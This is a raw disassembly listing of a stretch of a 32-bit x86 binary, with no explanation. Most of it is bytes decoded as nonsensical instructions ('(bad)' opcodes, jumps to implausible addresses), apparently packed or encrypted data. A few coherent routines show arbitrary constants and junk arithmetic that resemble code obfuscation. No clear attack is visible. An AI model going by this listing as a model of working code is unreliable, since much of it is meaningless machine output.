  415786:	add    DWORD PTR [edi+edx*8-0x31],ebx
  41578a:	pop    es
  41578b:	rcr    cl,0x52
  41578e:	xor    esi,edx
  415790:	aad    0x60
  415792:	shl    esp,0xd9
  415795:	mov    ch,0xc4
  415797:	mov    eax,ds:0x4a54e5dc
  41579c:	xchg   edx,eax
  41579d:	adc    DWORD PTR [esi-0x71],esi
  4157a0:	enter  0x8d07,0x72
  4157a4:	inc    ecx
  4157a5:	inc    esp
  4157a6:	mov    edi,0x3a5a9681
  4157ab:	pop    edx
  4157ac:	leave  
  4157ad:	mov    edx,0xacca8bdb
  4157b2:	and    BYTE PTR [ebp+0x2a],ah
  4157b5:	or     esi,DWORD PTR [edx]
  4157b7:	es cs pop ss
  4157ba:	fcom   DWORD PTR [esi+0x13dac24a]
  4157c0:	mov    dl,0xab
  4157c2:	mov    esi,0xa76e1d57
  4157c7:	push   0x14113827
  4157cc:	sub    DWORD PTR [esi],ebp
  4157ce:	jno    0x4157f4
  4157d0:	call   0xc2dd94a3
  4157d5:	clc    
  4157d6:	ret    0x642e
  4157d9:	inc    esp
  4157da:	push   eax
  4157db:	sub    al,0xb0
  4157dd:	push   esi
  4157de:	jae    0x415809
  4157e0:	pop    edi
  4157e1:	rcr    BYTE PTR [edi-0x6923135a],0xd0
  4157e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157e9:	std    
  4157ea:	mov    ebx,0xca9697fa
  4157ef:	sub    DWORD PTR [edi-0x77572431],ecx
  4157f5:	push   ds
  4157f6:	inc    edi
  4157f7:	or     bh,BYTE PTR [esi-0x7]
  4157fa:	sbb    BYTE PTR [eax],ah
  4157fc:	ins    BYTE PTR es:[edi],dx
  4157fd:	aaa    
  4157fe:	add    al,0x7f
  415800:	popf   
  415801:	xor    DWORD PTR [edx+0x2ea43537],0x51
  415808:	or     BYTE PTR [ecx+eiz*1-0x3d9d7341],cl
  41580f:	les    edx,FWORD PTR [ecx]
  415811:	aas    
  415812:	hlt    
  415813:	fwait
  415814:	gs scas eax,DWORD PTR es:[edi]
  415816:	aaa    
  415817:	jmp    0xa75f8547
  41581c:	lods   al,BYTE PTR ds:[esi]
  41581d:	mov    WORD PTR [ebx-0x4def4a95],ds
  415823:	jmp    DWORD PTR [edx]
  415825:	jmp    FWORD PTR [ebx]
  415827:	cdq    
  415828:	sub    bh,BYTE PTR [ebp-0x2c35d966]
  41582e:	dec    esp
  41582f:	fdiv   QWORD PTR [ebx]
  415831:	mov    ds:0xb7453116,eax
  415836:	adc    ecx,esp
  415838:	sub    al,0xfe
  41583a:	mov    dh,0xe2
  41583c:	popf   
  41583d:	fisttp WORD PTR fs:[esi+0x3ba66e4d]
  415844:	in     eax,dx
  415845:	inc    edi
  415846:	out    0xc3,eax
  415848:	mov    eax,DWORD PTR [esi+0x5b5f2579]
  41584e:	jae    0x415866
  415850:	hlt    
  415851:	and    ebp,DWORD PTR [eax-0x24]
  415854:	pop    es
  415855:	xchg   ecx,eax
  415856:	(bad)  
  415858:	sar    DWORD PTR [ecx+esi*1],1
  41585b:	pusha  
  41585c:	or     dh,BYTE PTR [eax+0x1bef0599]
  415862:	sub    al,0xcf
  415864:	xchg   BYTE PTR [edi+0x50072da9],dh
  41586a:	int3   
  41586b:	mov    ax,0x3c07
  41586f:	mov    edx,0x9d68673e
  415874:	mov    fs,ecx
  415876:	je     0x4158ae
  415878:	mov    DWORD PTR [edx+0x29996959],edi
  41587e:	pop    eax
  41587f:	xchg   ebp,eax
  415880:	(bad)  
  415881:	data16 mov al,ds:0x688fd49c
  415887:	cmp    al,0x9d
  415889:	push   ds
  41588a:	mov    ah,0x2f
  41588c:	sbb    DWORD PTR [eax-0xe],ebx
  41588f:	mov    eax,0x1eb6fdd9
  415894:	add    eax,0x48426382
  415899:	mov    al,0x15
  41589b:	xor    dl,BYTE PTR [edi]
  41589d:	xor    DWORD PTR [esi-0x14],esp
  4158a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158a1:	mov    al,0x1d
  4158a3:	fldcw  WORD PTR ds:0x3d78e6b6
  4158a9:	or     eax,edx
  4158ab:	push   0x1
  4158ad:	add    eax,edi
  4158af:	push   eax
  4158b0:	lea    eax,[ebp-0x13]
  4158b3:	push   eax
  4158b4:	shl    ecx,0x1e
  4158b7:	call   0x411c08
  4158bc:	mov    eax,DWORD PTR [ebp+0x10]
  4158bf:	mov    ecx,DWORD PTR [ebp+0x14]
  4158c2:	shrd   eax,ecx,0x2
  4158c6:	shr    ecx,0x2
  4158c9:	mov    ecx,DWORD PTR [ebp+0x10]
  4158cc:	mov    edx,DWORD PTR [ebp+0x14]
  4158cf:	xor    eax,esi
  4158d1:	xor    edx,edx
  4158d3:	or     eax,edx
  4158d5:	add    eax,edi
  4158d7:	push   0x1
  4158d9:	push   eax
  4158da:	mov    eax,DWORD PTR [ebp+0x8]
  4158dd:	shl    ecx,0x1e
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	shrd   eax,ecx,0x2
  4158e7:	shr    ecx,0x2
  4158ea:	mov    ecx,DWORD PTR [ebp+0x8]
  4158ed:	mov    edx,DWORD PTR [ebp+0xc]
  4158f0:	xor    eax,esi
  4158f2:	xor    edx,edx
  4158f4:	or     eax,edx
  4158f6:	add    eax,edi
  4158f8:	push   eax
  4158f9:	shl    ecx,0x1e
  4158fc:	call   0x411c08
  415901:	push   0x1
  415903:	lea    eax,[ebp-0x13]
  415906:	push   eax
  415907:	mov    eax,DWORD PTR [ebp+0x10]
  41590a:	mov    ecx,DWORD PTR [ebp+0x14]
  41590d:	shrd   eax,ecx,0x2
  415911:	shr    ecx,0x2
  415914:	mov    ecx,DWORD PTR [ebp+0x10]
  415917:	mov    edx,DWORD PTR [ebp+0x14]
  41591a:	xor    eax,esi
  41591c:	xor    edx,edx
  41591e:	or     eax,edx
  415920:	add    eax,edi
  415922:	push   eax
  415923:	shl    ecx,0x1e
  415926:	call   0x411c08
  41592b:	mov    eax,DWORD PTR [ebp+0x10]
  41592e:	mov    ecx,DWORD PTR [ebp+0x14]
  415931:	shrd   eax,ecx,0x2
  415935:	shr    ecx,0x2
  415938:	mov    ecx,DWORD PTR [ebp+0x10]
  41593b:	mov    edx,DWORD PTR [ebp+0x14]
  41593e:	pop    edi
  41593f:	xor    eax,esi
  415941:	xor    edx,edx
  415943:	pop    esi
  415944:	shl    ecx,0x1e
  415947:	or     eax,edx
  415949:	pop    ebx
  41594a:	leave  
  41594b:	ret    0x10
  41594e:	mov    eax,DWORD PTR [esp+0x8]
  415952:	or     DWORD PTR ds:0x428475,0x7249
  41595c:	mov    ecx,DWORD PTR [esp+0x10]
  415960:	or     ecx,eax
  415962:	mov    DWORD PTR ds:0x428511,0x6956
  41596c:	mov    ecx,DWORD PTR [esp+0xc]
  415970:	jne    0x4159ee
  415976:	cmp    DWORD PTR ds:0x4283e5,0x0
  41597d:	mov    DWORD PTR ds:0x428505,0x1bde
  415987:	mov    DWORD PTR ds:0x428429,0x1ea7
  415991:	jmp    0x4159e5
  415996:	mov    eax,0x417c
  41599b:	mov    DWORD PTR ds:0x428531,ebx
  4159a1:	cmp    DWORD PTR ds:0x4283e5,0x0
  4159a8:	jne    0x4159d1
  4159ae:	push   DWORD PTR [ebp-0x28]
  4159b1:	call   DWORD PTR ds:0x42e0e0
  4159b7:	adc    DWORD PTR ds:0x428475,0x4283b9
  4159c1:	sub    DWORD PTR ds:0x4283ed,0x4284a9
  4159cb:	and    DWORD PTR ds:0x428405,edi
  4159d1:	mov    DWORD PTR ds:0x42841d,0x6bfe
  4159db:	adc    DWORD PTR ds:0x42848d,0x437a
  4159e5:	mov    eax,DWORD PTR [esp+0x4]
  4159e9:	mul    ecx
  4159eb:	ret    0x10
  4159ee:	push   ebx
  4159ef:	mul    ecx
  4159f1:	mov    ebx,eax
  4159f3:	mov    eax,DWORD PTR [esp+0x8]
  4159f7:	mul    DWORD PTR [esp+0x14]
  4159fb:	add    ebx,eax
  4159fd:	mov    eax,DWORD PTR [esp+0x8]
  415a01:	mul    ecx
  415a03:	add    edx,ebx
  415a05:	pop    ebx
  415a06:	ret    0x10
  415a09:	push   ebp
  415a0a:	mov    ebp,esp
  415a0c:	sub    esp,0x44
  415a0f:	push   ebx
  415a10:	push   esi
  415a11:	push   edi
  415a12:	mov    DWORD PTR [ebp-0x18],0x2
  415a19:	mov    DWORD PTR [ebp-0x14],0x29f0
  415a20:	mov    DWORD PTR [ebp-0x10],0x3716
  415a27:	mov    DWORD PTR [ebp-0x2c],0x4e09
  415a2e:	mov    DWORD PTR [ebp-0x28],0x4497
  415a35:	mov    DWORD PTR [ebp-0x24],0x5
  415a3c:	mov    DWORD PTR [ebp-0x20],0x2a0a
  415a43:	mov    DWORD PTR [ebp-0x1c],0x1
  415a4a:	mov    DWORD PTR [ebp-0xc],0xce6
  415a51:	mov    DWORD PTR [ebp-0x8],0x12b3
  415a58:	mov    DWORD PTR [ebp-0x4],0xb09
  415a5f:	mov    DWORD PTR [ebp-0x44],0x7617
  415a66:	mov    DWORD PTR [ebp-0x40],0x721a
  415a6d:	mov    DWORD PTR [ebp-0x3c],0x5151
  415a74:	mov    DWORD PTR [ebp-0x38],0x14aa
  415a7b:	mov    DWORD PTR [ebp-0x34],0x5a28
  415a82:	mov    DWORD PTR [ebp-0x30],0x19a8
  415a89:	mov    ecx,DWORD PTR [ebp-0x1c]
  415a8c:	mov    eax,DWORD PTR [ebp-0x20]
  415a8f:	xor    edx,edx
  415a91:	div    ecx
  415a93:	mov    ecx,DWORD PTR [ebp-0x24]
  415a96:	xor    edx,edx
  415a98:	mov    esi,0x1ac5
  415a9d:	push   0x20
  415a9f:	div    ecx
  415aa1:	mov    ecx,DWORD PTR [ebp-0x28]
  415aa4:	xor    edx,edx
  415aa6:	xor    eax,0x60dc
  415aab:	sub    eax,ecx
  415aad:	mov    ecx,DWORD PTR [ebp-0x2c]
  415ab0:	lea    edi,[eax+ecx*1-0x6300]
  415ab7:	mov    eax,DWORD PTR [ebp-0x4]
  415aba:	mov    ecx,DWORD PTR [ebp-0x8]
  415abd:	sub    eax,0x7721
  415ac2:	xor    eax,ecx
  415ac4:	mov    ecx,DWORD PTR [ebp-0xc]
  415ac7:	xor    eax,ecx
  415ac9:	or     eax,0x7bc9
  415ace:	xor    eax,0xfffff0db
  415ad3:	mov    ebx,edi
  415ad5:	sub    ebx,eax
  415ad7:	mov    eax,DWORD PTR [ebp-0x10]
  415ada:	mov    ecx,DWORD PTR [ebp-0x14]
  415add:	xor    eax,ecx
  415adf:	mov    ecx,DWORD PTR [ebp-0x18]
  415ae2:	sub    eax,esi
  415ae4:	div    ecx
  415ae6:	mov    ecx,0x211
  415aeb:	pop    edx
  415aec:	xor    eax,ecx
  415aee:	jmp    0x415ef7
  415af3:	push   ds
  415af4:	inc    ecx
  415af5:	cmp    edi,esi
  415af7:	mov    edx,0x9f9c24b7
  415afc:	push   ecx
  415afd:	mov    ebp,0xf0d3c3cf
  415b02:	iret   
  415b03:	pushf  
  415b04:	mov    esp,0xc48ebebe
  415b09:	mov    esi,0x7d20febe
  415b0e:	ret    
  415b0f:	mov    DWORD PTR [edx-0xfd6dd08],ebx
  415b15:	cdq    
  415b16:	pop    eax
  415b17:	cmp    al,0xd3
  415b19:	dec    esi
  415b1a:	jle    0x415b97
  415b1c:	dec    ebp
  415b1d:	xor    BYTE PTR [ebp-0x27],dl
  415b20:	icebp  
  415b21:	lods   eax,DWORD PTR ds:[esi]
  415b22:	dec    edx
  415b23:	mov    ebp,0x45f3e8c0
  415b28:	add    edi,DWORD PTR [edx+0x74]
  415b2b:	lods   eax,DWORD PTR ds:[esi]
  415b2c:	sbb    BYTE PTR [eax+0x3be9e45c],bl
  415b32:	fs and al,0x65
  415b35:	adc    DWORD PTR [ecx],0x6974a30e
  415b3b:	in     eax,0xcd
  415b3d:	rcl    DWORD PTR [ebp+edi*4+0x4ea95b6c],1
  415b44:	inc    ebp
  415b45:	sub    al,0xff
  415b47:	cld    
  415b48:	shr    BYTE PTR [edx-0x4d0abb36],0xdc
  415b4f:	cmp    al,0x98
  415b51:	jno    0x415b6e
  415b53:	inc    esp
  415b54:	cmp    al,0xdd
  415b56:	dec    esi
  415b57:	xchg   DWORD PTR [esi-0x25188e0b],esp
  415b5d:	push   es
  415b5e:	xor    ebp,0xc2097714
  415b64:	pop    edi
  415b65:	in     eax,dx
  415b66:	cmp    dl,BYTE PTR [ebx+0x3524c824]
  415b6c:	sub    bl,BYTE PTR [ebx]
  415b6e:	shl    BYTE PTR [esi+0x240ffca8],0xdf
  415b75:	and    al,BYTE PTR [edi+0x57]
  415b78:	or     al,0x61
  415b7a:	inc    edx
  415b7b:	inc    ecx
  415b7c:	daa    
  415b7d:	imul   eax,DWORD PTR [ecx],0x69
  415b80:	aam    0xe2
  415b82:	dec    esi
  415b83:	mov    al,ds:0xdbdb612f
  415b88:	mov    edi,0xaabb0409
  415b8d:	loope  0x415b89
  415b8f:	add    eax,0x87ded63f
  415b94:	inc    esi
  415b95:	jmp    0x320580d7
  415b9a:	iret   
  415b9b:	mov    bl,0xe
  415b9d:	ins    DWORD PTR es:[edi],dx
  415b9e:	ds xchg ebx,eax
  415ba0:	scas   eax,DWORD PTR es:[edi]
  415ba1:	mov    cl,0x69
  415ba3:	mov    cl,0x13
  415ba5:	mov    bl,0x6d
  415ba7:	sub    ebx,DWORD PTR [esi+esi*1+0xf77b201]
  415bae:	jg     0x415b51
  415bb0:	sub    bh,ah
  415bb2:	dec    ecx
  415bb3:	(bad)  
  415bb4:	push   ds
  415bb5:	xchg   esp,eax
  415bb6:	dec    ebx
  415bb7:	mov    ds:0xc92ae7ae,al
  415bbc:	xor    eax,0xe9ed2d71
  415bc1:	xchg   ebx,eax
  415bc2:	add    eax,DWORD PTR [esi]
  415bc4:	imul   esp,DWORD PTR [ecx+0x7a],0x887ae972
  415bcb:	xchg   esi,eax
  415bcc:	push   ecx
  415bcd:	iret   
  415bce:	popa   
  415bcf:	push   eax
  415bd0:	jno    0x415b77
  415bd2:	stos   DWORD PTR es:[edi],eax
  415bd3:	ret    
  415bd4:	in     eax,dx
  415bd5:	aad    0x1f
  415bd7:	jmp    0x415c2d
  415bd9:	cmp    eax,0xb89020b9
  415bde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bdf:	mov    ah,0x5b
  415be1:	mov    ds,WORD PTR [eax+0x53fdbc8f]
  415be7:	bswap  esi
  415be9:	cmp    ecx,ebx
  415beb:	(bad)  
  415bec:	aaa    
  415bed:	sub    BYTE PTR [ecx+0x5e],0x6e
  415bf1:	mov    ebp,0x7a6b0d72
  415bf6:	xchg   edx,eax
  415bf7:	sbb    DWORD PTR [edx],edx
  415bf9:	das    
  415bfa:	test   BYTE PTR [eax+0x78],0x9b
  415bfe:	pop    ss
  415bff:	mov    esi,0x7448d5f
  415c04:	pand   mm4,QWORD PTR [eax+0x169baf3c]
  415c0b:	cmp    ch,ah
  415c0d:	inc    eax
  415c0e:	or     dh,BYTE PTR [eax+0x3bd9acd8]
  415c14:	ret    
  415c15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c16:	fist   DWORD PTR [edx+0x58ef00cb]
  415c1c:	cmp    al,0xe
  415c1e:	xor    al,0xe8
  415c20:	sbb    DWORD PTR [ebp+ebx*1+0x42],0x8fabd882
  415c28:	ins    DWORD PTR es:[edi],dx
  415c29:	jmp    0x8a1302e9
  415c2e:	jbe    0x415c87
  415c30:	test   ah,bl
  415c32:	loopne 0x415bf7
  415c34:	push   ebx
  415c35:	(bad)  
  415c36:	sti    
  415c37:	dec    esp
  415c38:	rcl    BYTE PTR ds:0x89d06ea,1
  415c3e:	xrelease mov DWORD PTR [edi],ebx
  415c41:	imul   ecx,eax,0x3f
  415c44:	mov    ch,ch
  415c46:	mov    ch,0x56
  415c48:	adc    al,0x7c
  415c4a:	lock aad 0xcd
  415c4d:	out    0xd,al
  415c4f:	push   edx
  415c50:	pop    ecx
  415c51:	nop
  415c52:	ud2    
  415c54:	popa   
  415c55:	mov    ah,0xe9
  415c57:	mov    al,ds:0x131c9e88
  415c5c:	and    DWORD PTR [eax+0x42e407a3],esp
  415c62:	sub    eax,0xbe82e16d
  415c67:	mov    eax,ds:0x4196ee0d
  415c6c:	xchg   BYTE PTR [esp+edx*1-0x6e],bh
  415c70:	dec    esi
  415c71:	test   al,0x17
  415c73:	jae    0x415c5f
  415c75:	adc    BYTE PTR [edi-0xb],bl
  415c78:	jns    0x415c46
  415c7a:	jo     0x415c30
  415c7c:	push   ebx
  415c7d:	fadd   DWORD PTR [esi]
  415c7f:	jg     0x415caa
  415c81:	imul   edx,DWORD PTR [ecx],0x39
  415c84:	scas   al,BYTE PTR es:[edi]
  415c85:	xchg   edi,eax
  415c86:	pop    esp
  415c87:	repnz fucomi st,st(1)
  415c8a:	sbb    DWORD PTR [edi+0xc],ebp
  415c8d:	je     0x415d00
  415c8f:	lods   al,BYTE PTR ds:[esi]
  415c90:	imul   edx,DWORD PTR [ebp-0x503307db],0xffffffa6
  415c97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c98:	call   0x5373fd3b
  415c9d:	inc    esp
  415c9e:	sahf   
  415c9f:	sub    dh,al
  415ca1:	addr16 mov dl,0x5f
  415ca4:	shr    BYTE PTR [edi+0x71],1
  415ca7:	aad    0xf5
  415ca9:	not    DWORD PTR [ebp-0x79]
  415cac:	inc    esp
  415cad:	adc    bl,BYTE PTR [esi+0x2c]
  415cb0:	in     al,dx
  415cb1:	and    bh,cl
  415cb3:	mov    eax,ds:0x48ead1c8
  415cb8:	xchg   al,bh
  415cba:	push   cs
  415cbb:	fs and al,0xb6
  415cbe:	(bad)  
  415cbf:	jns    0x415cc3
  415cc1:	hlt    
  415cc2:	test   BYTE PTR [edx+ebp*4-0x47],dh
  415cc6:	shl    ah,1
  415cc8:	rcr    BYTE PTR [ebp+edx*8-0x5b140f17],1
  415ccf:	mov    ebx,0x7039c19d
  415cd4:	int    0x26
  415cd6:	cmp    esi,ecx
  415cd8:	ror    BYTE PTR [esi],1
  415cda:	cmc    
  415cdb:	dec    BYTE PTR [ebx-0x7d]
  415cde:	push   ds
  415cdf:	retf   0x22fc
  415ce2:	jl     0x415d34
  415ce4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ce5:	not    WORD PTR [ebx]
  415ce8:	test   eax,0xfd2bdf94
  415ced:	addr16 jle 0x415c7b
  415cf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cf1:	aas    
  415cf2:	jbe    0x415cdf
  415cf4:	fldenv [eax-0x17]
  415cf7:	lahf   
  415cf8:	or     eax,0xe1962d3e
  415cfd:	pop    es
  415cfe:	cmc    
  415cff:	sbb    DWORD PTR [edx+ecx*4],edx
  415d02:	xor    eax,0x8dd8570
  415d07:	daa    
  415d08:	mov    dl,0x8b
  415d0a:	and    esp,DWORD PTR [edi]
  415d0c:	nop
  415d0d:	(bad)  
  415d0e:	(bad)  
  415d10:	dec    eax
  415d11:	pop    es
  415d12:	mov    bl,0x3b
  415d14:	sub    dl,BYTE PTR [edx]
  415d16:	lea    edi,[ebx+eiz*2-0x36]
  415d1a:	test   DWORD PTR fs:[eax+ebp*8+0x78ffae80],ecx
  415d22:	(bad)  
  415d24:	push   ecx
  415d25:	inc    esi
  415d26:	xor    eax,0x75222442
  415d2b:	out    0x8,al
  415d2d:	aas    
  415d2e:	test   al,0xe2
  415d30:	daa    
  415d31:	fucompp 
  415d33:	cmp    esp,ebp
  415d35:	outs   dx,DWORD PTR ds:[esi]
  415d36:	mov    ?,ebp
  415d38:	jb     0x415d3e
  415d3a:	bound  ecx,QWORD PTR [edi-0x1af9e2c5]
  415d40:	addr16 (bad) 
  415d42:	push   edx
  415d43:	test   al,0x62
  415d45:	mov    esi,0xef9b5a28
  415d4a:	cdq    
  415d4b:	xchg   esp,eax
  415d4c:	add    DWORD PTR ds:0x8549ad63,0x5569911d
  415d56:	mov    bl,0x6b
  415d58:	push   esp
  415d59:	push   0xde81f50e
  415d5e:	sbb    al,0x66
  415d60:	aaa    
  415d61:	inc    ebp
  415d62:	pop    ecx
  415d63:	shl    BYTE PTR ss:0xb98234f2,1
  415d6a:	pop    esp
  415d6b:	push   ss
  415d6c:	in     eax,0x12
  415d6e:	lahf   
  415d6f:	and    BYTE PTR [edx],0x6
  415d72:	sbb    dl,dl
  415d74:	and    DWORD PTR [edx],edx
  415d76:	pop    edi
  415d77:	aam    0xce
  415d79:	mov    eax,ds:0xa76768bb
  415d7e:	dec    esi
  415d7f:	and    ebx,DWORD PTR [eax-0x6e]
  415d82:	je     0x415d48
  415d84:	cmp    DWORD PTR [ebx+0x26bfbce6],edx
  415d8a:	add    DWORD PTR [edx],0xffffff8d
  415d8d:	sbb    al,0xa0
  415d8f:	daa    
  415d90:	mov    ds:0x5218b1a5,al
  415d95:	pop    edx
  415d96:	mov    bh,0x4c
  415d98:	inc    ecx
  415d99:	push   edi
  415d9a:	es fcmovne st,st(4)
  415d9d:	sbb    esi,DWORD PTR [ebx+0x2f]
  415da0:	inc    eax
  415da1:	lea    edi,[ebx]
  415da3:	arpl   WORD PTR [ebp+0x2bc71a82],bx
  415da9:	mov    edx,0x884d1af
  415dae:	mov    esp,0x77253b21
  415db3:	and    eax,DWORD PTR [ecx]
  415db5:	adc    DWORD PTR [esi-0x57],esi
  415db8:	mov    cl,BYTE PTR [edx-0x7f63340e]
  415dbe:	xchg   DWORD PTR [ebx-0x478fbd8f],ebx
  415dc4:	in     eax,dx
  415dc5:	inc    ebx
  415dc6:	inc    edx
  415dc7:	mov    edi,0x59cffa99
  415dcc:	daa    
  415dcd:	retf   0x4edb
  415dd0:	scas   al,BYTE PTR es:[edi]
  415dd1:	shl    BYTE PTR [edi-0x2ac96cb5],cl
  415dd7:	sub    eax,0x66d6e7d8
  415ddc:	out    0x49,eax
  415dde:	aad    0xe7
  415de0:	and    DWORD PTR [ecx+0x63],edx
  415de3:	out    0xa4,al
  415de5:	inc    esp
  415de6:	xchg   edx,eax
  415de7:	add    bl,bl
  415de9:	push   ebp
  415dea:	loopne 0x415da9
  415dec:	or     DWORD PTR [esp+esi*4+0x48],ebp
  415df0:	or     al,0x57
  415df2:	rcr    eax,0x14
  415df5:	jns    0x415e6f
  415df7:	cmc    
  415df8:	jnp    0x415e20
  415dfa:	fild   DWORD PTR ds:0xe3e4a777
  415e00:	xor    BYTE PTR [ebp-0x42c624db],bl
  415e06:	cwde   
  415e07:	or     BYTE PTR [eax-0x5b],ah
  415e0a:	sahf   
  415e0b:	push   ss
  415e0c:	sub    DWORD PTR [eax-0x75],ecx
  415e0f:	mov    ds:0xcc87341,al
  415e14:	mov    eax,0x4011cc2c
  415e19:	std    
  415e1a:	pop    edi
  415e1b:	cld    
  415e1c:	retf   
  415e1d:	mov    ds:0x3ef2ab13,eax
  415e22:	and    al,0xfc
  415e24:	lods   al,BYTE PTR ds:[esi]
  415e25:	jae    0x415e6f
  415e27:	add    bh,al
  415e29:	outs   dx,BYTE PTR ds:[esi]
  415e2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e2b:	idiv   edi
  415e2d:	out    0x5a,al
  415e2f:	cmp    DWORD PTR [ebx],eax
  415e31:	popa   
  415e32:	xor    dl,0xfc
  415e35:	xchg   ebx,eax
  415e36:	add    eax,0x778565d9
  415e3b:	lods   al,BYTE PTR ds:[esi]
  415e3c:	or     ch,0x9e
  415e3f:	adc    BYTE PTR [ebp+0x2c118ea2],ah
  415e45:	cmc    
  415e46:	popa   
  415e47:	pop    eax
  415e48:	adc    cl,bh
  415e4a:	add    al,0x81
  415e4c:	adc    al,0xb4
  415e4e:	dec    ecx
  415e4f:	add    al,0x5f
  415e51:	test   al,0xcb
  415e53:	lock sbb bh,BYTE PTR [edx-0x28]
  415e57:	(bad)  
  415e58:	mov    ecx,0xf0ed52e1
  415e5d:	(bad)  
  415e5e:	xchg   esi,eax
  415e5f:	jl     0x415df5
  415e61:	or     ebx,0x48
  415e64:	in     al,0x4a
  415e66:	push   cs
  415e67:	xor    bl,BYTE PTR [esi]
  415e69:	repnz aam 0x3f
  415e6c:	jle    0x415e70
  415e6e:	stos   BYTE PTR es:[edi],al
  415e6f:	jnp    0x415e0b
  415e71:	cs jbe 0x415e87
  415e74:	rcl    BYTE PTR [ebx-0x7619fe3b],cl
  415e7a:	jmp    0x415e38
  415e7c:	mov    BYTE PTR [edi],bl
  415e7e:	cmp    BYTE PTR ds:0xee886876,0x6e
  415e85:	aad    0x7f
  415e87:	retf   
  415e88:	shr    DWORD PTR [ebp-0x623cb495],0xbe
  415e8f:	xchg   ebp,eax
  415e90:	jo     0x415f0a
  415e92:	imul   ebx,DWORD PTR [ebx+0x5b],0xffffffdc
  415e96:	push   ecx
  415e97:	stc    
  415e98:	out    dx,eax
  415e99:	lock and BYTE PTR [ebx-0x80],0xa7
  415e9e:	dec    esi
  415e9f:	push   ds
  415ea0:	mov    BYTE PTR ds:0x6672e7e,bl
  415ea6:	scas   al,BYTE PTR es:[edi]
  415ea7:	inc    edi
  415ea8:	ret    
  415ea9:	push   edi
  415eaa:	mov    bl,0x26
  415eac:	repnz inc eax
  415eae:	mov    ebp,0xc34349f0
  415eb3:	cmp    al,0x10
  415eb5:	rol    BYTE PTR [ebp+0x7655d752],0xcf
  415ebc:	inc    ecx
  415ebd:	call   0xf8783990
  415ec2:	push   ebp
  415ec3:	mov    cl,0xe5
  415ec5:	cmp    edx,esi
  415ec7:	ds cmp al,0x7c
  415eca:	ja     0x415f27
  415ecc:	dec    DWORD PTR [eax-0x55]
  415ecf:	mov    bl,0xbf
  415ed1:	jecxz  0x415e98
  415ed3:	ins    BYTE PTR es:[edi],dx
  415ed4:	pop    ebp
  415ed5:	push   ebp
  415ed6:	sbb    cl,dl
  415ed8:	cmp    ecx,esi
  415eda:	sub    ah,al
  415edc:	sub    eax,0x4b80405
  415ee1:	adc    dh,BYTE PTR [eax]
  415ee3:	mov    esp,0x70966980
  415ee8:	aas    
  415ee9:	dec    edi
  415eea:	push   cs
  415eeb:	sbb    al,0x70
  415eed:	jne    0x415f2e
  415eef:	aad    0xe5
  415ef1:	loop   0x415f0e
  415ef3:	clc    
  415ef4:	ficom  WORD PTR [edi+0x39]
  415ef7:	sub    edx,eax
  415ef9:	cmp    ebx,edx
  415efb:	ja     0x4167d7
  415f01:	jmp    0x415f09
  415f06:	mov    edi,DWORD PTR [ebp-0x2c]
  415f09:	mov    DWORD PTR [ebp-0x20],0x1aa3
  415f10:	mov    DWORD PTR [ebp-0x24],0x52d
  415f17:	mov    DWORD PTR [ebp-0x28],0x226c
  415f1e:	jmp    0x416327
  415f23:	dec    eax
  415f24:	pop    edi
  415f25:	xor    ch,BYTE PTR [esi-0x48b34bc6]
  415f2b:	inc    edx
  415f2c:	imul   edx,edi,0x9a5087e3
  415f32:	jecxz  0x415fa0
  415f34:	(bad)  
  415f35:	sar    BYTE PTR [esi-0x41413b72],0x2d
  415f3c:	xor    bh,BYTE PTR [eax]
  415f3e:	xchg   edx,eax
  415f3f:	ret    
  415f40:	cli    
  415f41:	xchg   BYTE PTR [ecx-0x2d4d8f6c],dh
  415f47:	das    
  415f48:	je     0x415ee4
  415f4a:	push   ss
  415f4b:	loopne 0x415f87
  415f4d:	cmp    ebp,ecx
  415f4f:	xchg   ebp,eax
  415f50:	xor    BYTE PTR fs:[edx-0x1e],bl
  415f54:	imul   edx,ecx,0xffffffe5
  415f57:	mov    bh,0xe7
  415f59:	sahf   
  415f5a:	cmp    BYTE PTR [ebx-0x15d804f3],dh
  415f60:	pop    edx
  415f61:	jmp    0x415eeb
  415f63:	mul    BYTE PTR [edx-0x40]
  415f66:	xor    DWORD PTR [ebx+0x9dde541],esp
  415f6c:	mov    edi,0xaf2d1009
  415f71:	dec    edx
  415f72:	pop    es
  415f73:	faddp  st(6),st
  415f75:	mov    esi,?
  415f77:	out    dx,al
  415f78:	test   eax,0x978700f
  415f7d:	loopne 0x415fb3
  415f7f:	aam    0x6a
  415f81:	fimul  DWORD PTR [edi-0x5ab08f62]
  415f87:	xlat   BYTE PTR ds:[ebx]
  415f88:	sti    
  415f89:	sub    bl,BYTE PTR [edx+ebx*2]
  415f8c:	and    al,0x6
  415f8e:	xchg   edi,eax
  415f8f:	pop    es
  415f90:	scas   al,BYTE PTR es:[edi]
  415f91:	pop    esp
  415f92:	(bad)  
  415f93:	lock std 
  415f95:	mov    ebx,0x4716c259
  415f9a:	iret   
  415f9b:	ins    DWORD PTR es:[edi],dx
  415f9c:	cmp    DWORD PTR [ebx+0xb],eax
  415f9f:	loope  0x415ff2
  415fa1:	push   ebx
  415fa2:	sub    DWORD PTR [eax*4+0x4a51b5a5],esi
  415fa9:	loop   0x415ffe
  415fab:	stc    
  415fac:	add    al,BYTE PTR [esi]
  415fae:	jne    0x41601f
  415fb0:	data16 xor dh,cl
  415fb3:	pop    ecx
  415fb4:	bound  edx,QWORD PTR [edx]
  415fb6:	std    
  415fb7:	jns    0x415f6c
  415fb9:	jg     0x416022
  415fbb:	sbb    ebp,edi
  415fbd:	and    esp,esi
  415fbf:	push   esp
  415fc0:	mov    al,ds:0xc91186e7
  415fc5:	dec    ebp
  415fc6:	mov    edx,0xc138f8b6
  415fcb:	add    edx,ebp
  415fcd:	(bad)  
  415fce:	in     al,dx
  415fcf:	call   0x80b3ba96
  415fd4:	mov    dl,0x7
  415fd6:	int3   
  415fd7:	push   edi
  415fd8:	push   cs
  415fd9:	(bad)  [edi-0x23]
  415fdc:	(bad)  
  415fde:	ins    DWORD PTR es:[edi],dx
